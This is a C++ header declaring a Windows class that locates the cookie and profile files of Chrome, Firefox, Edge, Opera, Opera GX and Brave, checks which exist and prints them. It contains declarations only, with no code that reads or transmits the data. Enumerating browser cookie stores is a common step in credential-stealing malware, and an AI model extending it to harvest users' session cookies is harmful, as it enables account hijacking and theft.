#ifndef BROWSERCOOKIESPATHS_H
#define BROWSERCOOKIESPATHS_H

#include <string>
#include <vector>
#include <Windows.h>

class BrowserCookiesPaths {
public:
    bool DoesFileExist(const std::wstring& filePath);
    std::wstring GetUsername();
    std::wstring GetChromeCookiesPath();
    std::wstring GetFirefoxProfilesPath();
    std::wstring GetEdgeCookiesPath();
    std::wstring GetOperaStableCookiesPath();
    std::wstring GetOperaGXStableCookiesPath();
    std::wstring GetBraveCookiesPath();
    std::vector<std::wstring> GetCookiePaths();
    void PrintExistedCookiePaths(const std::vector<std::wstring>& cookiePaths);
};

#endif // BROWSERCOOKIESPATHS_H
